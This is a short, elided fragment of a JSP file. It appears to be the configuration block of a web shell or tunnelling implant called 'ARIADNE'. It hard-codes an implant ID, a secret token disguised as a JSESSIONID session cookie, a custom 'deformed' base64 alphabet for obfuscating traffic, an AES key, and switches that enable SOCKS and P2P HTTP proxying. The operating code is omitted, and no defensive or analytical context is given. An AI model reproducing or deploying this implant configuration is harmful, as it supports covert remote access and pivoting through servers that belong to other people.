...
<%!
    ...
    // --- Configuration ---
    static final String ARIADNE_UUID = "c2479c8b-86e7-4878-9a1a-837afc17aead";
    static final String ARIADNE_AUTH_METHOD = "cookie";
    static final String ARIADNE_AUTH_NAME = "JSESSIONID";
    static final String ARIADNE_AUTH_VALUE = "99a90a567ac143d79b1b139226fadf86";
    static final String ARIADNE_ENCODING = "deformed_base64";
    static final String ARIADNE_DEFORMED_ALPHABET = "Hg93m2Jt+LYCTzEhuN6bkfSlIwvjPD5WR71iMQnqVAK0FOead/X4GcUx8yosZpBr";
    ...
    static final String ARIADNE_AES_KEY = "q/M/DCDX9LJWwqd5hDt+4POFrwoLBnKia+iR73K5eB8=";
    ...
    static final boolean ARIADNE_ENABLE_SOCKS = true;
    static final boolean ARIADNE_ENABLE_P2P_HTTP = true;
